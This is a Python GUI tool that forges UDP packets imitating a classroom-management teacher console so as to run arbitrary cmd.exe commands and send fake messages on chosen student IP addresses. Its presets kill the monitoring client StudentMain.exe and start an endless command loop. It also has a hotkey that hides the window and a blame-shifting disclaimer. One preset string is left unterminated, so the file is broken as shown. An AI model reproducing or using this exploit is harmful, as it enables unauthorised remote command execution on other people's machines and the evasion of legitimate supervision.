#coding:utf-8
import binascii
import socket
import sys
import tkinter as tk
from tkinter import messagebox, END
import keyboard 


num = 0
#预命令

PRESET_COMMANDS = [
    "自行添加命令",
    "echo >C:\\Users\\Administrator\\Desktop\\test.txt",
    "for /l %a in (0,0,1) do @echo off",
    "taskkill -F -IM StudentMain.exe",
    r'start 
]


def send_payload(command_str, target_ip):
    global num
    if not target_ip:
        messagebox.showwarning("警告", "请先在列表中选中一个目标IP！")
        return
    #用来执行命令前提
    ml = "C:\\WINDOWS\\system32\\cmd.exe"
    cs = "/c " + command_str
    
    payload = b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00"#包名前缀
    payload += num.to_bytes(1, byteorder='little', signed=False)
    num += 1
    if num == 99:
        num = 0
    payload += b"\xca\x6c\x1a\xee\x10\x8e\x41\x9f\x49\x72\xf3\x6d\x10\x9c\x69\x20\x4e\x00\x00\xc0\xa8\x03\xfe\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
    #模仿官方前缀
    aaa = "".join([hex(ord(i))[2:] + "00" for i in ml])
    bbb = "".join([hex(ord(i))[2:] + "00" for i in cs])
    
    send_ml = binascii.unhexlify(aaa)
    send_cs = binascii.unhexlify(bbb)
        
    payload += send_ml
    payload += b"\x00" * (512 - len(send_ml))
    payload += send_cs
    payload += b"\x00" * (324 - len(send_cs))
    payload += b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    #一样的
    port = 4705
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (target_ip, port))
        s.close()
        log_text.insert(END, f"[成功] 已向 {target_ip} 发送命令: {command_str}\n")
        log_text.see(END)
    except Exception as e:
        log_text.insert(END, f"[失败] 发送出错: {str(e)}\n")
        log_text.see(END)
        #提示防止
def send_message():
    global num
    try:
        selected_ip = ip_listbox.get(ip_listbox.curselection())
    except:
        messagebox.showerror("错误", "请在左侧列表中选中一个目标IP！")
        return
        
    message = msg_entry.get().strip()
    if not message:
        messagebox.showwarning("警告", "请输入要发送的消息内容！")
        return

    payload = b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x9e\x03\x00\x00\x7c"
    payload += num.to_bytes(1, byteorder='little', signed=False)
    num += 1
    if num == 99:
        num = 0
    payload += b"\x6b\xf7\x79\x0c\xdd\x46\x9d\x87\x4b\x4d\x79\xbc\x2b\x8d\x20\x4e\x00\x00\xc0\xa8\xab\x83\x91\x03\x00\x00\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
#模仿信息发送
    aaa = ""
    for i in message:
        if ("a" <= i <= "z") or ("A" <= i <= "Z"):
            aaa += "00"
        aaa += hex(ord(i))[2:]
    
    js = 0
    aaa_list = list(aaa)
    for _ in aaa_list:
        if js % 4 == 0 and js + 3 < len(aaa_list):
            aaa_list[js], aaa_list[js+2] = aaa_list[js+2], aaa_list[js]
            aaa_list[js+1], aaa_list[js+3] = aaa_list[js+3], aaa_list[js+1]
        js += 1
    aaa = ''.join(aaa_list)
    
    try:
        send_msg_data = binascii.unhexlify(aaa)
        payload += send_msg_data
        payload += b"\x00" * (898 - len(send_msg_data))

        port = 4705
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (selected_ip, port))
        s.close()
        log_text.insert(END, f"[成功] 已向 {selected_ip} 发送消息: {message}\n")
        log_text.see(END)
        msg_entry.delete(0, tk.END)
    except Exception as e:
        log_text.insert(END, f"[失败] 消息发送出错: {str(e)}\n")
        log_text.see(END)
#提示用的

def load_command_to_input(cmd):
    command_entry.delete(0, tk.END)
    command_entry.insert(0, cmd)
#zzh
def execute_input_command():
    cmd = command_entry.get().strip()
    if not cmd:
        messagebox.showwarning("警告", "请输入要执行的系统命令！")
        return
    try:
        selected_ip = ip_listbox.get(ip_listbox.curselection())
        send_payload(cmd, selected_ip)
    except:
        messagebox.showerror("错误", "请在左侧列表中选中一个目标IP！")

def execute_kill_student():
    kill_cmd = "taskkill -F -IM StudentMain.exe"#快捷防止看不懂
    try:
        selected_ip = ip_listbox.get(ip_listbox.curselection())
        send_payload(kill_cmd, selected_ip)
    except:
        messagebox.showerror("错误", "请在左侧列表中选中一个目标IP！")

def add_ip():
    ip = ip_entry.get().strip()
    if ip:
        ip_listbox.insert(END, ip)
        ip_entry.delete(0, tk.END)

def del_ip():
    try:
        ip_listbox.delete(ip_listbox.curselection())
    except:
        pass


def toggle_window_visibility(*event):
    if root.state() == 'withdrawn':
        root.deiconify()
    else:
        root.withdraw()


def open_help():
    help_win = tk.Toplevel(root)
    help_win.title("帮助与介绍")
    help_win.geometry("400x350")
    help_win.resizable(False, False)
    
    help_text = (
        "【使用方法】\n"
        "1. 按 Ctrl+Z 可隐藏/显示本窗口\n"
    )
    #可自行添加帮助
    text_widget = tk.Text(help_win, wrap="word", padx=10, pady=10, height=15)
    text_widget.pack(fill="both", expand=True)
    text_widget.insert("1.0", help_text)
    text_widget.config(state="disabled") 

def show_disclaimer():
    
    disclaimer_win = tk.Toplevel(root)
    disclaimer_win.title("免责声明")
    disclaimer_win.geometry("350x180")
    disclaimer_win.resizable(False, False)

    disclaimer_win.protocol("WM_DELETE_WINDOW", lambda: None)
    
    disclaimer_win.transient(root) 
   
    disclaimer_win.grab_set() 
    
    label = tk.Label(disclaimer_win, text="免责声明：\n\n使用此程序所造成的一切后果将由使用者本人承担，\n与作者无关。", pady=20)
    label.pack()

    def on_agree():
        disclaimer_win.destroy() 
    
    def on_refuse():
        disclaimer_win.destroy()
        root.destroy() 
        sys.exit()

    btn_frame = tk.Frame(disclaimer_win)
    btn_frame.pack(pady=10)
    
   
    agree_btn = tk.Button(btn_frame, text="同意", bg="#4CAF50", fg="white", width=10, command=on_agree)
    agree_btn.pack(side="left", padx=10)
    
  
    refuse_btn = tk.Button(btn_frame, text="拒绝", bg="#f44336", fg="white", width=10, command=on_refuse)
    refuse_btn.pack(side="left", padx=10)


if __name__ == "__main__":
    root = tk.Tk()                                                                           
    root.title("请自行修改程序名字")                                                              
    root.geometry("750x550")
    root.resizable(False, False)
    
    keyboard.add_hotkey('ctrl+z', toggle_window_visibility)
#上面这个是用来关联全局，用于快速隐藏
   
    show_disclaimer()

   
    top_bar = tk.Frame(root, padx=10, pady=5)
    top_bar.pack(fill="x")
    
    tk.Button(top_bar, text="⊕", font=("Arial", 12), width=2, command=open_help).pack(side="right")

  
    left_frame = tk.Frame(root, padx=10, pady=5)
    left_frame.pack(side="left", fill="y")

    tk.Label(left_frame, text="目标IP管理").pack()#可以快速选择已有ip
    ip_entry = tk.Entry(left_frame, width=15)
    ip_entry.pack(pady=5)
    ip_entry.bind("<Return>", lambda event: add_ip())
    
    btn_frame = tk.Frame(left_frame)
    btn_frame.pack(pady=5)
    tk.Button(btn_frame, text="添加IP", command=add_ip).pack(side="left", padx=5)
    tk.Button(btn_frame, text="删除IP", command=del_ip).pack(side="left", padx=5)

    ip_listbox = tk.Listbox(left_frame, width=18, height=22)
    ip_listbox.pack(pady=5)
    ip_listbox.bind("<Delete>", lambda event: del_ip())


    right_frame = tk.Frame(root, padx=10, pady=5)
    right_frame.pack(side="left", fill="both", expand=True)

    tk.Label(right_frame, text="预设命令（点击填入）：").pack(anchor="w")
    
    preset_frame = tk.Frame(right_frame)
    preset_frame.pack(fill="x", pady=5)
    
    for i, cmd in enumerate(PRESET_COMMANDS):
        btn_text = cmd[:12] + ".." if len(cmd) > 12 else cmd
        tk.Button(preset_frame, text=btn_text, command=lambda c=cmd: load_command_to_input(c)).grid(row=i//2, column=i%2, sticky="ew", padx=2, pady=2)

    tk.Label(right_frame, text="自定义命令输入：").pack(anchor="w", pady=(10, 0))
    command_entry = tk.Entry(right_frame)
    command_entry.pack(fill="x", pady=5)
    command_entry.bind("<Return>", lambda event: execute_input_command())

    exec_btn_frame = tk.Frame(right_frame)
    exec_btn_frame.pack(fill="x", pady=10)
    
    tk.Button(exec_btn_frame, text="执行输入框命令", bg="#4CAF50", fg="white", command=execute_input_command).pack(side="left", padx=5)
    tk.Button(exec_btn_frame, text="脱离控制", bg="#f44336", fg="white", command=execute_kill_student).pack(side="right", padx=5)

    msg_frame = tk.LabelFrame(right_frame, text="发送消息", padx=5, pady=5)
    msg_frame.pack(fill="x", pady=10)
    msg_entry = tk.Entry(msg_frame)
    msg_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))
    tk.Button(msg_frame, text="发送消息", bg="#2196F3", fg="white", command=send_message).pack(side="left")

    tk.Label(right_frame, text="操作日志：").pack(anchor="w")#用来测试不用可以注释掉
    log_text = tk.Text(right_frame, height=12, state="normal")
    log_text.pack(fill="both", expand=True)


    root.mainloop()
    keyboard.unhook_all()
